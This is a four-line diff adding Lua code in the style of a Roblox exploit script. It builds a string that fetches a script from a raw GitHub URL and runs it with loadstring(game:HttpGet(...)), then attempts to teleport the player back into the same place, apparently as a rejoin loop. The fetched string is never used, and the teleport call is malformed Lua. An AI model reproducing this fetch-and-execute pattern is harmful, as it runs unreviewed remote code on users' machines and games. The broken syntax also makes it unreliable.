@@ -1,0 +1,4 @@
+local queueCode = [[
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/piKeeper/LoopRJ/refs/heads/main/Script1"))()
+]]
+game:GetService:TeleportService:Teleport(game.PlaceId, game.Players.LocalPlayer)
